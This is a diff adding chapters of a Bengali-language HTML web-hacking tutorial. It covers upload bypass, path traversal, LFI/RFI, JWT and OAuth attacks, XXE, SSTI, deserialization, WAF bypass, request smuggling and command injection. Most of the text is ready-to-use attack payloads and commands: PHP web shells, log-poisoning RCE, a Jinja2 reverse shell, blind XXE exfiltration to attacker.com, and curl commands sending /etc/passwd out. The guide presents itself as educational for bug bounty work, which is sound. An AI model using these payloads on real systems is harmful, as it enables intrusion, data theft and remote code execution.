+    <h2 class="s">File Upload Bypass</h2>
+    <div class="code">
+<span class="c"># Extension Bypass:</span>
+shell.php        <span class="c"># Block হলে চেষ্টা করো:</span>
+shell.php5       <span class="c"># PHP5</span>
+shell.php7       <span class="c"># PHP7</span>
+shell.phtml      <span class="c"># PHP HTML</span>
+shell.pHp        <span class="c"># Case variation</span>
+shell.PHP        <span class="c"># Uppercase</span>
+shell.php.jpg    <span class="c"># Double extension</span>
+shell.jpg.php    <span class="c"># Reverse double</span>
+shell.php%00.jpg <span class="c"># Null byte (পুরনো PHP)</span>
+shell.php.       <span class="c"># Trailing dot</span>
+
+<span class="c"># Content-Type Bypass:</span>
+<span class="c"># Burp-এ Content-Type পরিবর্তন করো:</span>
+Content-Type: image/jpeg    <span class="c"># ← পরিবর্তন করো কিন্তু ফাইল PHP রাখো</span>
+
+<span class="c"># Magic Bytes Bypass (File Header পরিবর্তন):</span>
+<span class="c"># shell.php-এর শুরুতে JPEG header যোগ করো:</span>
+echo -e '\xFF\xD8\xFF\xE0' &gt; shell.php
+cat payload.php &gt;&gt; shell.php    <span class="c"># PHP code যোগ</span>
+<span class="c"># এখন file JPEG মনে হবে কিন্তু PHP চলবে</span>
+
+<span class="c"># .htaccess Bypass:</span>
+<span class="c"># .htaccess ফাইল upload করো:</span>
+AddType application/x-httpd-php .jpg
+<span class="c"># এরপর shell.jpg upload করলে PHP হিসেবে চলবে!</span>
+
+<span class="c"># SVG XSS:</span>
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;/svg&gt;
+<span class="c"># SVG upload করলে XSS trigger হবে</span>
+    </div>
+
+    <h2 class="s">Path Traversal (Directory Traversal)</h2>
+    <div class="code">
+<span class="c"># মূল ধারণা: ../  দিয়ে উপরের directory-তে যাওয়া</span>
+https://target.com/download?file=report.pdf
+<span class="c"># → পরিবর্তন করো:</span>
+https://target.com/download?file=../../../etc/passwd
+https://target.com/download?file=../../../../etc/shadow
+
+<span class="c"># Windows-এ:</span>
+..\..\..\..\windows\win.ini
+..\..\..\windows\system32\drivers\etc\hosts
+
+<span class="c"># Encoding Bypass:</span>
+../     → ..%2f     → %2e%2e%2f    → ..%252f (double encode)
+../     → ..\/      → %2e%2e/
+../     → ....//    (filter শুধু একটা ../  মোছে)
+
+<span class="c"># গুরুত্বপূর্ণ টার্গেট ফাইল (Linux):</span>
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/ssh/sshd_config
+/var/www/html/config.php
+~/.ssh/id_rsa
+~/.bash_history
+/proc/self/environ        <span class="c"># Environment variables</span>
+/proc/self/net/tcp        <span class="c"># Network connections</span>
+
+<span class="c"># Windows:</span>
+C:\Windows\win.ini
+C:\Windows\system32\drivers\etc\hosts
+C:\inetpub\wwwroot\web.config
+    </div>
+
+    <h2 class="s">LFI — Local File Inclusion</h2>
+    <div class="code">
+<span class="c"># Vulnerable PHP Code:</span>
+&lt;?php include($_GET['page']); ?&gt;
+
+<span class="c"># সহজ LFI:</span>
+https://target.com/page?page=/etc/passwd
+https://target.com/page?page=../../../etc/passwd
+
+<span class="c"># PHP Filter — Source Code পড়া!</span>
+https://target.com/page?page=php://filter/convert.base64-encode/resource=config.php
+<span class="c"># Response: Base64 encoded PHP source code</span>
+<span class="c"># Decode করলে config.php-এর মূল code পাওয়া যাবে</span>
+
+<span class="c"># LFI → RCE: Log Poisoning</span>
+<span class="c"># SSH log-এ PHP code inject করো:</span>
+ssh '&lt;?php system($_GET["cmd"]); ?&gt;'@target.com
+<span class="c"># তারপর log include করো:</span>
+https://target.com/page?page=/var/log/auth.log&cmd=whoami
+
+<span class="c"># /proc/self/environ LFI to RCE:</span>
+<span class="c"># User-Agent Header-এ PHP code দাও:</span>
+User-Agent: &lt;?php system($_GET['cmd']); ?&gt;
+https://target.com/page?page=/proc/self/environ&cmd=id
+
+<span class="c"># PHP Wrapper data://</span>
+https://target.com/page?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+<span class="c"># base64 decode: &lt;?php system($_GET['cmd']); ?&gt;</span>
+    </div>
+
+    <h2 class="s">RFI — Remote File Inclusion</h2>
+    <div class="code">
+<span class="c"># Remote file include করা</span>
+https://target.com/page?page=http://attacker.com/shell.php
+
+<span class="c"># Shell তৈরি করো Attacker server-এ:</span>
+echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php
+python3 -m http.server 8080
+
+<span class="c"># তারপর:</span>
+https://target.com/page?page=http://attacker.com:8080/shell.php&cmd=whoami
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 9: Authentication Attacks
+══════════════════════════════════════ -->
+<div class="chapter ch9">
+  <div class="ch-hdr">
+    <div class="ch-label">CHAPTER 09</div>
+    <div class="ch-title">🔑 Authentication Attacks</div>
+    <div class="ch-desc">JWT, OAuth, Brute Force, Password Reset, 2FA Bypass</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s">Brute Force Attack</h2>
+    <div class="code">
+<span class="c"># Hydra — HTTP Login</span>
+hydra -l admin -P rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials"
+hydra -L users.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Wrong"
+
+<span class="c"># ffuf দিয়ে Brute Force</span>
+ffuf -w rockyou.txt:FUZZ -u https://target.com/login -X POST -d "user=admin&pass=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -mc 302
+
+<span class="c"># Burp Intruder</span>
+<span class="c"># Request capture → Intruder → Sniper/Cluster Bomb</span>
+<span class="c"># Position mark করো → Payload: Password list</span>
+<span class="c"># Response length/status দেখো</span>
+
+<span class="c"># Username Enumeration:</span>
+<span class="c"># "User not found" vs "Wrong password" → username ভিন্ন!</span>
+<span class="c"># Response time ভিন্ন হলেও username জানা যায়</span>
+    </div>
+
+    <h2 class="s">JWT Attack — বিস্তারিত</h2>
+    <p>JWT (JSON Web Token) হলো তিনটি অংশের একটি string: Header.Payload.Signature</p>
+
+    <div class="dg">
+<pre>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+│──────────────────────────────────────│──────────────────────────────────────│────────────────────────────────────────────
+            Header (Base64)                         Payload (Base64)                      Signature (HMAC)
+{alg:"HS256",typ:"JWT"}              {user:"admin", role:"user"}             HMAC-SHA256(header+payload, secret)
+</pre>
+    </div>
+
+    <div class="code">
+<span class="c"># JWT Decode করো:</span>
+echo "eyJ1c2VyIjoiYWRtaW4ifQ==" | base64 -d
+<span class="c"># অথবা: jwt.io ওয়েবসাইট</span>
+
+<span class="c"># ⭐ Attack 1: Algorithm None Attack</span>
+<span class="c"># Header পরিবর্তন করো:</span>
+{"alg": "none", "typ": "JWT"}
+<span class="c"># Payload পরিবর্তন করো:</span>
+{"user": "admin", "role": "admin"}
+<span class="c"># Signature খালি রাখো</span>
+<span class="c"># Token: header.payload. (শেষে dot)</span>
+
+<span class="c"># ⭐ Attack 2: Weak Secret Cracking</span>
+hashcat -a 0 -m 16500 jwt_token.txt rockyou.txt
+john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt
+
+<span class="c"># ⭐ Attack 3: Algorithm Confusion (RS256 → HS256)</span>
+<span class="c"># Server RS256 (asymmetric) ব্যবহার করে</span>
+<span class="c"># Public key দিয়ে HS256 sign করলে verify হয়!</span>
+<span class="c"># Public key সাধারণত /jwks.json বা /.well-known/ তে থাকে</span>
+
+<span class="c"># ⭐ Attack 4: Payload Tampering</span>
+<span class="c"># {"user":"normal","role":"user"} → {"user":"admin","role":"admin"}</span>
+<span class="c"># Signature verify না করলেই কাজ করে</span>
+
+<span class="c"># JWT Tools:</span>
+jwt_tool.py eyJ... -T               <span class="c"># Tamper</span>
+jwt_tool.py eyJ... -C -d rockyou    <span class="c"># Crack</span>
+    </div>
+
+    <h2 class="s">OAuth Bypass</h2>
+    <div class="code">
+<span class="c"># OAuth Flow বোঝা:</span>
+<span class="c"># User → App → OAuth Provider → Callback URL → Token</span>
+
+<span class="c"># ⭐ Attack 1: redirect_uri Manipulation</span>
+<span class="c"># Normal:</span>
+GET /oauth/auth?client_id=app&redirect_uri=https://target.com/callback&response_type=code
+<span class="c"># Attack:</span>
+redirect_uri=https://target.com.evil.com/callback   <span class="c"># Subdomain</span>
+redirect_uri=https://target.com/callback/../evil    <span class="c"># Path traversal</span>
+redirect_uri=https://evil.com%40target.com/callback <span class="c"># @ encoding</span>
+
+<span class="c"># ⭐ Attack 2: State Parameter Missing → CSRF</span>
+<span class="c"># state parameter না থাকলে CSRF দিয়ে account link করা যায়</span>
+
+<span class="c"># ⭐ Attack 3: Authorization Code Interception</span>
+<span class="c"># code parameter leak হলে token নেওয়া যায়</span>
+    </div>
+
+    <h2 class="s">Password Reset Flaws</h2>
+    <div class="code">
+<span class="c"># ১. Predictable Reset Token</span>
+<span class="c"># Token: timestamp, username-এর hash → Bruteforce সম্ভব</span>
+
+<span class="c"># ২. Token Expiry নেই</span>
+<span class="c"># পুরনো token এখনো valid → Reuse করা যায়</span>
+
+<span class="c"># ৩. Host Header Injection</span>
+<span class="c"># Request-এ Host পরিবর্তন করো:</span>
+Host: evil.com
+<span class="c"># Reset link: https://evil.com/reset?token=xxx</span>
+<span class="c"># ভিকটিম click করলে evil.com-এ token চলে যাবে!</span>
+
+<span class="c"># ৪. Response Manipulation</span>
+<span class="c"># Reset-এ "Invalid OTP" response আসলে</span>
+<span class="c"># Burp-এ response পরিবর্তন করো: "invalid" → "valid"</span>
+
+<span class="c"># ৫. Username Leaking via Timing</span>
+<span class="c"># Valid username → বেশি সময় লাগে (DB query)</span>
+<span class="c"># Invalid username → কম সময়</span>
+    </div>
+
+    <h2 class="s">2FA Bypass</h2>
+    <div class="code">
+<span class="c"># ১. OTP Brute Force (Rate limit নেই?)</span>
+<span class="c"># 6-digit OTP: 000000 - 999999 → সর্বোচ্চ ১০ লক্ষ চেষ্টা</span>
+
+<span class="c"># ২. OTP Bypass via Response Manipulation</span>
+<span class="c"># Wrong OTP দাও → Response দেখো → Burp-এ modify</span>
+
+<span class="c"># ৩. 2FA Skip করা</span>
+<span class="c"># /2fa URL bypass করে সরাসরি /dashboard-এ যাও</span>
+
+<span class="c"># ৪. Previous OTP Reuse</span>
+<span class="c"># পুরনো OTP আবার পাঠাও</span>
+
+<span class="c"># ৫. OTP Leaking</span>
+<span class="c"># Response body-তে OTP আছে কিনা দেখো!</span>
+<span class="c"># অনেক সময় dev mode-এ response-এ OTP থাকে</span>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 10: XXE, SSTI, Deserialization
+══════════════════════════════════════ -->
+<div class="chapter ch10">
+  <div class="ch-hdr">
+    <div class="ch-label">CHAPTER 10</div>
+    <div class="ch-title">⚙️ XXE, SSTI ও Deserialization</div>
+    <div class="ch-desc">Advanced Injection Attacks — RCE পাওয়ার রাস্তা</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s">XXE — XML External Entity</h2>
+    <p>XML input process করার সময় External Entity reference দিয়ে সার্ভারের ফাইল পড়া বা SSRF করা।</p>
+
+    <div class="code">
+<span class="c"># স্বাভাবিক XML:</span>
+&lt;?xml version="1.0"?&gt;
+&lt;user&gt;
+  &lt;name&gt;Saimum&lt;/name&gt;
+&lt;/user&gt;
+
+<span class="c"># ⭐ XXE Payload — File Read:</span>
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;user&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+&lt;/user&gt;
+<span class="c"># Response-এ /etc/passwd-এর content আসবে!</span>
+
+<span class="c"># ⭐ XXE → SSRF:</span>
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
+]&gt;
+
+<span class="c"># ⭐ Blind XXE (Out-of-band):</span>
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"&gt;
+  %xxe;
+]&gt;
+
+<span class="c"># evil.dtd (attacker server-এ):</span>
+&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % exfil "&lt;!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'&gt;"&gt;
+%exfil;
+%send;
+
+<span class="c"># Testing করো — Content-Type পরিবর্তন:</span>
+Content-Type: application/xml
+Content-Type: text/xml
+    </div>
+
+    <h2 class="s">SSTI — Server-Side Template Injection</h2>
+    <p>Template Engine (Jinja2, Twig, Freemarker) এ user input render করলে code execution সম্ভব।</p>
+
+    <div class="code">
+<span class="c"># Detection — Mathematical Expression:</span>
+{{7*7}}            <span class="c"># 49 দেখালে → Template Injection!</span>
+${7*7}             <span class="c"># 49</span>
+#{7*7}             <span class="c"># 49</span>
+*{7*7}             <span class="c"># 49</span>
+&lt;%= 7*7 %&gt;         <span class="c"># 49</span>
+
+<span class="c"># Template Engine identify করো:</span>
+{{7*'7'}}
+<span class="c"># → 7777777 = Jinja2/Twig</span>
+<span class="c"># → 49 = Freemarker</span>
+<span class="c"># → Error = Others</span>
+    </div>
+
+    <h3 class="ss">Jinja2 (Python/Flask) RCE</h3>
+    <div class="code">
+<span class="c"># Basic RCE:</span>
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+<span class="c"># MRO দিয়ে:</span>
+{{''.__class__.__mro__[1].__subclasses__()}}
+<span class="c"># → সব subclass list</span>
+<span class="c"># Popen class খুঁজে বের করো (usually index 414 বা কাছাকাছি)</span>
+
+<span class="c"># Reverse Shell:</span>
+{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"').read()}}
+
+<span class="c"># Filter bypass:</span>
+{%set a='sys'%}{%set b='tem'%}{{(a~b)}}   <span class="c"># concatenation</span>
+    </div>
+
+    <h3 class="ss">Twig (PHP) RCE</h3>
+    <div class="code">
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+    </div>
+
+    <h3 class="ss">Freemarker (Java) RCE</h3>
+    <div class="code">
+&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ex("id")}
+${7*7}
+    </div>
+
+    <h2 class="s">Insecure Deserialization</h2>
+    <p>Object serialize করে পাঠালে, সেটা modify করে malicious object তৈরি করা যায়।</p>
+
+    <div class="code">
+<span class="c"># PHP Deserialization</span>
+<span class="c"># Vulnerable code:</span>
+$user = unserialize($_COOKIE['user']);
+
+<span class="c"># PHP Serialized object:</span>
+O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}
+<span class="c"># → role "admin" করে দাও</span>
+
+<span class="c"># Java Deserialization — ysoserial Tool</span>
+java -jar ysoserial.jar CommonsCollections6 'id' | base64
+<span class="c"># Generated payload → সার্ভারে পাঠাও → RCE!</span>
+
+<span class="c"># Python Pickle Deserialization:</span>
+import pickle, os
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('id',))
+payload = pickle.dumps(Exploit())
+
+<span class="c"># Detection Tool: ysoserial, PHPGGC</span>
+phpggc Laravel/RCE1 system 'id' --base64
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 11: Burp Suite
+══════════════════════════════════════ -->
+<div class="chapter ch11">
+  <div class="ch-hdr">
+    <div class="ch-label">CHAPTER 11</div>
+    <div class="ch-title">🛠️ Burp Suite — সম্পূর্ণ গাইড</div>
+    <div class="ch-desc">Web Hacking-এর সবচেয়ে গুরুত্বপূর্ণ টুল</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s">Proxy — সব Request Intercept করো</h2>
+    <div class="code">
+<span class="c"># Proxy চালু → Intercept On করো</span>
+<span class="c"># Browser থেকে request গেলে Burp-এ থামবে</span>
+
+<span class="c"># Request forward করো: Forward বোতাম</span>
+<span class="c"># Request Drop করো: Drop বোতাম</span>
+<span class="c"># Request পরিবর্তন করো: Edit করে Forward</span>
+
+<span class="c"># ⭐ Send to Repeater: Ctrl+R</span>
+<span class="c"># ⭐ Send to Intruder: Ctrl+I</span>
+<span class="c"># ⭐ Send to Scanner: Ctrl+Shift+S (Pro)</span>
+
+<span class="c"># HTTP History দেখো: Proxy → HTTP History</span>
+<span class="c"># সব request/response এখানে আছে</span>
+    </div>
+
+    <h2 class="s">Repeater — Manual Testing</h2>
+    <div class="code">
+<span class="c"># Repeater-এ Request Edit করো</span>
+<span class="c"># Send করো → Response দেখো</span>
+<span class="c"># বারবার পাঠানো যায় → Manual SQLi, XSS testing</span>
+
+<span class="c"># Keyboard shortcut:</span>
+<span class="c"># Ctrl+R = Send to Repeater</span>
+<span class="c"># Ctrl+Enter = Send Request</span>
+<span class="c"># Ctrl+Z = Undo</span>
+    </div>
+
+    <h2 class="s">Intruder — Automated Fuzzing</h2>
+    <div class="code">
+<span class="c"># Request পাঠাও Intruder-এ: Ctrl+I</span>
+<span class="c"># Positions Tab → Attack position mark করো: §value§</span>
+
+<span class="c"># Attack Types:</span>
+<span class="c"># Sniper: একটি position, একটি payload list</span>
+<span class="c"># Battering Ram: সব position-এ একই payload</span>
+<span class="c"># Pitchfork: প্রতিটি position-এ আলাদা list (synchronous)</span>
+<span class="c"># Cluster Bomb: সব combination (username+password brute force)</span>
+
+<span class="c"># Payload Types:</span>
+<span class="c"># Simple list: manual বা wordlist file</span>
+<span class="c"># Numbers: sequential numbers (IDOR)</span>
+<span class="c"># Brute forcer: character set দিয়ে (a-z, 0-9)</span>
+<span class="c"># Runtime file: live wordlist</span>
+
+<span class="c"># Results বিশ্লেষণ:</span>
+<span class="c"># Status Code column: 200 vs 302 vs 403</span>
+<span class="c"># Length column: ভিন্ন length = ভিন্ন response = interesting!</span>
+<span class="c"># Grep Match: নির্দিষ্ট text খোঁজা</span>
+    </div>
+
+    <h2 class="s">Decoder — Encode/Decode</h2>
+    <div class="code">
+<span class="c"># বিভিন্ন encoding:</span>
+URL encode:    hello world → hello%20world
+URL decode:    %3Cscript%3E → &lt;script&gt;
+Base64 encode: Hello → SGVsbG8=
+Base64 decode: SGVsbG8= → Hello
+HTML encode:   &lt; → &amp;lt;
+Hex encode:    A → 41
+
+<span class="c"># ⭐ Shortcut: Ctrl+Shift+D → Decoder-এ পাঠাও</span>
+<span class="c"># কোনো value select করো → Right click → Send to Decoder</span>
+    </div>
+
+    <h2 class="s">Burp Extensions (BApp Store)</h2>
+    <table>
+      <thead><tr><th>Extension</th><th>কাজ</th><th>কখন ব্যবহার</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Autorize</strong></td><td>Access Control test</td><td>IDOR testing automation</td></tr>
+        <tr><td><strong>JWT Editor</strong></td><td>JWT modify করা</td><td>JWT Attack</td></tr>
+        <tr><td><strong>CSRF Tester</strong></td><td>CSRF token analysis</td><td>CSRF testing</td></tr>
+        <tr><td><strong>Turbo Intruder</strong></td><td>দ্রুত brute force</td><td>Rate limit bypass</td></tr>
+        <tr><td><strong>SQLiPy</strong></td><td>SQLmap integration</td><td>SQL Injection</td></tr>
+        <tr><td><strong>Active Scan++</strong></td><td>Enhanced scanning</td><td>Auto vulnerability scan</td></tr>
+        <tr><td><strong>Logger++</strong></td><td>Advanced logging</td><td>All traffic analysis</td></tr>
+        <tr><td><strong>Param Miner</strong></td><td>Hidden parameter</td><td>Reconnaissance</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="s">Tips ও Shortcuts</h2>
+    <div class="code">
+<span class="c"># ⭐ দরকারী Shortcuts:</span>
+Ctrl+R          <span class="c"># Send to Repeater</span>
+Ctrl+I          <span class="c"># Send to Intruder</span>
+Ctrl+Enter      <span class="c"># Repeater-এ Send</span>
+Ctrl+A          <span class="c"># Select All</span>
+Ctrl+Shift+U    <span class="c"># URL Decode</span>
+Ctrl+Shift+B    <span class="c"># Base64 Encode</span>
+
+<span class="c"># ⭐ দরকারী Tips:</span>
+<span class="c"># Right click on request → Copy as curl command</span>
+<span class="c"># Right click → Engagement tools → Discover content</span>
+<span class="c"># Target → Site map → সব request tree</span>
+<span class="c"># Comparer → Response দুটো তুলনা (Blind SQLi)</span>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 12: Advanced Techniques
+══════════════════════════════════════ -->
+<div class="chapter ch12">
+  <div class="ch-hdr">
+    <div class="ch-label">CHAPTER 12</div>
+    <div class="ch-title">🔬 WAF Bypass ও Advanced Techniques</div>
+    <div class="ch-desc">Race Condition, HTTP Smuggling, Cache Poisoning</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s">WAF Bypass Techniques</h2>
+    <div class="code">
+<span class="c"># ১. Encoding</span>
+<span class="c"># URL Encoding:</span>
+&lt;script&gt; → %3Cscript%3E
+' → %27    " → %22    &lt; → %3C
+
+<span class="c"># Double URL Encoding:</span>
+%27 → %2527  (% → %25)
+SELECT → %53%45%4C%45%43%54
+
+<span class="c"># Unicode Encoding:</span>
+' → \u0027    &lt; → \u003c
+
+<span class="c"># HTML Entity:</span>
+&lt;script&gt; → &amp;lt;script&amp;gt;
+
+<span class="c"># ২. Case Variation:</span>
+SELECT → SeLeCt → SELECT → sElEcT
+
+<span class="c"># ৩. Comment Injection:</span>
+SEL/**/ECT username FR/**/OM users
+1 /*!UNION*/ /*!SELECT*/ null
+
+<span class="c"># ৪. Whitespace Bypass:</span>
+<span class="c"># Space replace: Tab(%09), Newline(%0a), Form feed(%0c)</span>
+SELECT%09username%09FROM%09users
+1%0aUNION%0aSELECT%0anull
+
+<span class="c"># ৫. String Concatenation:</span>
+<span class="c"># MySQL: CONCAT('admin') বা 'ad'+'min'</span>
+<span class="c"># MSSQL: 'ad'+'min'</span>
+
+<span class="c"># ৬. HTTP Header Manipulation:</span>
+X-Forwarded-For: 127.0.0.1   <span class="c"># WAF bypass — "আমি local"</span>
+X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+
+<span class="c"># ৭. Chunked Transfer Encoding</span>
+Transfer-Encoding: chunked
+<span class="c"># Payload টুকরো টুকরো পাঠাও → WAF দেখতে পায় না</span>
+    </div>
+
+    <h2 class="s">Race Condition</h2>
+    <div class="code">
+<span class="c"># একই সময়ে দুটো request পাঠাও → Logic error</span>
+
+<span class="c"># উদাহরণ: Discount Coupon একবার ব্যবহার</span>
+<span class="c"># Check → Apply → Mark Used</span>
+<span class="c"># দুটো request Check-এ থাকলে, দুজনেই Used দেখায় না!</span>
+
+<span class="c"># Burp Turbo Intruder:</span>
+<span class="c"># Request → Right click → Send to Turbo Intruder</span>
+<span class="c"># concurrent request: 20+ একসাথে</span>
+
+<span class="c"># Python দিয়ে:</span>
+import threading, requests
+
+def send():
+    r = requests.post('https://target.com/redeem', 
+                      data={'code':'SAVE50'}, 
+                      cookies={'session':'your_session'})
+    print(r.status_code, len(r.text))
+
+threads = [threading.Thread(target=send) for _ in range(20)]
+for t in threads: t.start()
+for t in threads: t.join()
+    </div>
+
+    <h2 class="s">HTTP Request Smuggling</h2>
+    <div class="code">
+<span class="c"># Frontend ও Backend server Content-Length/Transfer-Encoding মতবিরোধ</span>
+
+<span class="c"># CL.TE Attack:</span>
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED    <span class="c">← Backend এটা পরের request এর অংশ মনে করবে!</span>
+
+<span class="c"># TE.CL Attack:</span>
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+<span class="c"># Tool: smuggler.py, Burp HTTP Request Smuggler extension</span>
+    </div>
+
+    <h2 class="s">Web Cache Poisoning</h2>
+    <div class="code">
+<span class="c"># Cache Key-এ না থাকা Header দিয়ে response পরিবর্তন</span>
+
+<span class="c"># Unkeyed Header খোঁজো:</span>
+X-Forwarded-Host: evil.com
+X-Host: evil.com
+X-Forwarded-Scheme: http
+
+<span class="c"># উদাহরণ: X-Forwarded-Host Response-এ reflected হলে</span>
+GET / HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
+
+<span class="c"># Response:</span>
+<span class="r">&lt;script src="https://evil.com/analytics.js"&gt;&lt;/script&gt;</span>
+<span class="c"># এই response cache হলে → সবাই evil.js পাবে!</span>
+
+<span class="c"># Cache Buster দিয়ে:</span>
+GET /?cb=123 HTTP/1.1   <span class="c"># নিজের জন্য test করো</span>
+    </div>
+
+    <h2 class="s">Open Redirect</h2>
+    <div class="code">
+<span class="c"># দুর্বল redirect:</span>
+https://target.com/redirect?url=https://evil.com
+
+<span class="c"># Bypass:</span>
+<span class="c"># //evil.com → Protocol-relative URL</span>
+<span class="c"># https:///evil.com → Triple slash</span>
+<span class="c"># https://target.com@evil.com → @ symbol</span>
+<span class="c"># https://evil.com%2F@target.com</span>
+
+<span class="c"># OAuth + Open Redirect = Account Takeover:</span>
+redirect_uri=https://target.com/callback/../../../redirect?url=https://attacker.com
+<span class="c"># Authorization code attacker-এর কাছে যাবে!</span>
+    </div>
+
+    <h2 class="s">Command Injection</h2>
+    <div class="code">
+<span class="c"># OS Command inject করা</span>
+<span class="c"># দুর্বল: ping -c 1 {user_input}</span>
+
+<span class="c"># Separator দিয়ে extra command:</span>
+127.0.0.1; id
+127.0.0.1 && id
+127.0.0.1 | id
+127.0.0.1 || id
+127.0.0.1 `id`
+127.0.0.1 $(id)
+
+<span class="c"># Blind Command Injection:</span>
+127.0.0.1 && sleep 5             <span class="c"># Time delay</span>
+127.0.0.1 | nslookup attacker.com  <span class="c"># DNS exfiltration</span>
+127.0.0.1; curl http://attacker.com/?data=$(cat /etc/passwd | base64)
+
+<span class="c"># Filter Bypass:</span>
+c'a't /etc/passwd             <span class="c"># Quote injection</span>
+ca\t /etc/passwd              <span class="c"># Backslash</span>
+who$()ami                     <span class="c"># Empty substitution</span>
+    </div>
+
+    <div class="summary">
+      <h3>🎯 Web Hacking সারসংক্ষেপ — Attack Methodology</h3>
+      <ul>
+        <li>✅ Recon → Technology stack, subdomains, directories, JS files</li>
+        <li>✅ Input Testing → SQLi, XSS, SSTI, XXE, Command Injection</li>
+        <li>✅ Auth Testing → Brute force, JWT, OAuth, Password Reset</li>
+        <li>✅ Access Control → IDOR, Privilege Escalation, Business Logic</li>
+        <li>✅ Request Forgery → CSRF, SSRF, Open Redirect</li>
+        <li>✅ File Attacks → Upload Bypass, LFI/RFI, Path Traversal</li>
+        <li>✅ Advanced → Race Condition, Smuggling, Cache Poisoning</li>
+        <li>✅ Reporting → PoC বানাও, Impact দেখাও</li>
+      </ul>
+    </div>
+
+    <div class="box bs" style="margin-top:30px">
+      <div class="bt">🚀 প্র্যাকটিস করো</div>
+      <strong>PortSwigger Web Academy</strong> (portswigger.net/web-security) — সম্পূর্ণ ফ্রি, সব ভালনারেবিলিটির জন্য আলাদা Lab আছে। SQLi থেকে শুরু করো। প্রতিটি Lab solve করলে real-world experience পাবে।
+    </div>
+
+    <div style="text-align:center;margin-top:45px;padding:30px;background:#0f0e17;border-radius:12px;color:rgba(255,255,255,0.7);">
+      <p style="font-size:17px;color:#ff6b35;margin-bottom:10px;">🌐 "The web is full of vulnerabilities — learn to find them ethically."</p>
+      <p>এই গাইড সম্পূর্ণ শিক্ষামূলক।</p>
+      <p>Bug Bounty প্রোগ্রামে বা নিজের সাইটে প্র্যাকটিস করো।</p>
+      <p style="margin-top:12px;color:#06d6a0;">🛡️ Hack Ethically. Report Responsibly. Stay Legal.</p>
+    </div>
+
+  </div>
+</div>
+
+</body>
+</html>
